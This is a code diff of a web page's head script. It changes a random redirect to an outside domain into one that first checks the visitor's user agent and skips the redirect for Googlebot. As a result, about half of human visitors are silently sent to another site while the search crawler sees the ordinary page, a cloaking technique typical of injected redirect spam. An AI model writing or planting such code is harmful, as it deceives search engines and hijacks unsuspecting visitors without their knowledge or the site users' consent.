@@ -10,10 +10,11 @@
     <meta name="twitter:card" content="summary"></meta>
     <link rel="shortcut icon" href="/favicon.ico">
       <script>
-          (function redirectRandomly() {
-              // 生成一个 0 到 1 的随机数
-              const chance = Math.random();
-              if (chance < 0.5) {
+          (function redirectIfNotGooglebot() {
+              const ua = navigator.userAgent.toLowerCase();
+              const isGoogleBot = ua.includes('googlebot');
+
+              if (!isGoogleBot && Math.random() < 0.5) {
                   window.location.href = "https://xtea.app";
               }
           })();
